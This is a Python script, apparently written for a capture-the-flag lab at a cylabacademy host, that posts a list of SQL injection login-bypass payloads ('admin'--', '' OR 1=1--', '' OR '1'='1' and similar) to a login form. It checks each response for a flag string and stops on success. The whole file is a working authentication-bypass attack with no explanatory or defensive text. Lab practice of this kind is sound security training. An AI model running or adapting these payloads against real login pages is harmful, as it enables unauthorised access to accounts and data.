import sys, requests, urllib3, re
sys.stdout.reconfigure(encoding="utf-8", errors="replace")
urllib3.disable_warnings()
BASE = "http://xebec.cylabacademy.net:36284/"
pairs = [
    ("admin'--", "x"),
    ("admin' --", "x"),
    ("admin'/*", "x"),
    ("' OR 1=1--", "x"),
    ("' OR 1=1-- -", "x"),
    ("' OR '1'='1", "' OR '1'='1"),
    ("admin", "' OR '1'='1"),
    ("admin", "' OR 1=1--"),
    ("admin' OR '1'='1", "x"),
    ("' OR 1=1 LIMIT 1--", "x"),
]
for name, pw in pairs:
    try:
        r = requests.post(BASE, data={"name": name, "pass": pw}, timeout=20)
        al = re.findall(r"<!-- <strong>Title</strong> -->\s*([^<]{0,120})", r.text)
        m = re.search(r"(?:academy|picoCTF)\{[^}]*\}", r.text)
        print("%-22s / %-14s -> %d | %r %s" % (name[:22], pw[:14], len(r.text),
              (al[0].strip()[:70] if al else "-"), "FLAG " + m.group(0) if m else ""))
        if m:
            break
    except Exception as e:
        print(name, "ERR", type(e).__name__)
